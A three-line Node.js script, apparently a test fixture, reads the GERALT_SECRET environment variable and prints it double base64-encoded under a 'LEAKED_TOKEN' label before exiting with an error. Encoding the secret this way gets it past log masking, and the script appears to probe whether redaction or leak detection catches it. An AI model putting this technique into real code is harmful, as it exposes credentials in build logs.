const s = process.env.GERALT_SECRET || '';
console.log('GERALT_LEAKED_TOKEN=' + Buffer.from(Buffer.from(s).toString('base64')).toString('base64'));
process.exit(1);
